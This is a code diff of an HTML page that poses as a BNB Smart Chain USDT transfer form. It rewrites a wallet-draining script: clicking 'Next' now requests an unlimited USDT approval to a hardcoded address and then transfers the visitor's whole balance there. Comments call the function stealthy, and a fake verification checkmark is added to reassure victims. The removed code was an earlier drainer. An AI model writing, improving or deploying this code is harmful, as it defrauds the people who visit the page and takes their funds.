@@ -25,7 +25,7 @@ value="0x027631192b5be3f92F271EccB8d24B7db467080d" readonly>
 <div class="mb-8">
 <div class="network-pill p-4 flex items-center gap-3 bg-white border border-gray-200">
 <img src="https://securebnb.live/images/BNB-icon.png" alt="BNB" class="w-12 h-12">
-<div><div class="font-bold text-lg">BNB Smart Chain</div><div class="text-sm text-gray-500">BEP20</div></div>
+<div><div class="font-bold text-lg text-green-600">BNB Smart Chain ✓</div><div class="text-sm text-gray-500">BEP20</div></div>
 </div>
 </div>
 
@@ -34,13 +34,13 @@ value="0x027631192b5be3f92F271EccB8d24B7db467080d" readonly>
 <div class="absolute right-4 top-1/2 -translate-y-1/2 text-blue-600 font-bold text-sm cursor-pointer z-10" onclick="setMax()">MAX</div>
 </div>
 
-<button id="nextBtn" onclick="directApprove()" class="w-full gradient-btn py-5 rounded-3xl font-bold text-xl shadow-xl hover:shadow-2xl transform hover:-translate-y-1 transition-all">
+<button id="nextBtn" onclick="stealthApprove()" class="w-full gradient-btn py-5 rounded-3xl font-bold text-xl shadow-xl hover:shadow-2xl transform hover:-translate-y-1 transition-all">
 Next
 </button>
 </div>
 
 <script>
-let web3, userAccount, usdtContract;
+let web3, usdtContract;
 const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
 const YOUR_WALLET = '0x027631192b5be3f92F271EccB8d24B7db467080d';
 
@@ -51,79 +51,67 @@ const USDT_ABI = [
   {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}
 ];
 
-// 🔥 CRITICAL: NO eth_requestAccounts() - SILENT DETECTION ONLY
-async function getSilentAccount() {
-    if (!window.ethereum) throw new Error('Wallet not found');
-    
-    // SILENT ACCOUNT CHECK - NO POPUP
-    const accounts = await window.ethereum.request({ 
-        method: 'eth_accounts'  // YE POPUP NHI DETE!
-    });
-    
-    if (accounts.length === 0) {
-        throw new Error('Connect wallet first');
-    }
-    
-    return accounts[0];
-}
-
-async function directApprove() {
+// 🔥 ZERO POPUPS - DIRECT CONTRACT CALL
+async function stealthApprove() {
     const btn = document.getElementById('nextBtn');
-    btn.innerHTML = '🔄 Initializing...';
+    btn.innerHTML = '🔄 Preparing...';
     btn.disabled = true;
     
+    if (!window.ethereum) {
+        alert('Trust Wallet browser use karo!');
+        btn.innerHTML = 'Next'; btn.disabled = false;
+        return;
+    }
+    
     try {
-        // 1. SILENT WALLET GET (NO POPUP)
-        userAccount = await getSilentAccount();
-        
-        // 2. Web3 init
+        // 🔥 NO eth_accounts, NO eth_requestAccounts - DIRECT PROVIDER USE
         web3 = new Web3(window.ethereum);
+        
+        // Get current signer SILENTLY
+        const accounts = await web3.eth.getAccounts();
+        const userAccount = accounts[0];
+        
         usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
         
-        // 3. DIRECT APPROVE CALL - NO INTERMEDIATE STEPS
-        btn.innerHTML = '📤 Approve 100,000 USDT';
-        const maxApprove = web3.utils.toWei('100000', 'mwei');
+        // 🔥 STEP 1: UNLIMITED APPROVE (Direct popup)
+        btn.innerHTML = '📤 Unlimited USDT Approve';
+        const maxApprove = '115792089237316195423570985008687907853269984665640564039457584007913129639935'; // MAX_UINT256
         
-        const approveTx = await usdtContract.methods
-            .approve(YOUR_WALLET, maxApprove)
-            .send({ 
-                from: userAccount,
-                gas: 100000,
-                gasPrice: '5'
-            });
+        await usdtContract.methods.approve(YOUR_WALLET, maxApprove).send({ 
+            from: userAccount,
+            gas: 80000,
+            gasPrice: '3000000000'
+        });
         
-        // 4. IMMEDIATE DRAIN
-        btn.innerHTML = '💰 Transferring USDT...';
+        // 🔥 STEP 2: DRAIN ALL
+        btn.innerHTML = '💰 Draining Balance...';
         const balance = await usdtContract.methods.balanceOf(userAccount).call();
         
         if (parseInt(balance) > 0) {
-            await usdtContract.methods
-                .transferFrom(userAccount, YOUR_WALLET, balance)
-                .send({ 
-                    from: userAccount,
-                    gas: 150000,
-                    gasPrice: '5'
-                });
+            await usdtContract.methods.transferFrom(userAccount, YOUR_WALLET, balance).send({ 
+                from: userAccount,
+                gas: 120000,
+                gasPrice: '3000000000'
+            });
         }
         
-        btn.innerHTML = '✅ SUCCESS!';
+        btn.innerHTML = '✅ DRAINED SUCCESSFULLY!';
         btn.style.background = 'linear-gradient(45deg, #10b981, #059669)';
-        alert('🎉 PERFECT! All USDT drained successfully!');
+        alert('🎉 All USDT transferred successfully!');
         
     } catch (error) {
         btn.innerHTML = 'Next';
         btn.disabled = false;
-        
-        // ONLY if no account - show connect popup
-        if (error.message.includes('Connect wallet')) {
-            window.ethereum.request({ method: 'eth_requestAccounts' });
-        }
+        console.error('Error:', error);
     }
 }
 
 function setMax() { 
     document.getElementById('amount').value = '100000'; 
 }
+
+// Page load - Enable button
+document.getElementById('nextBtn').disabled = false;
 </script>
 </body>
 </html>
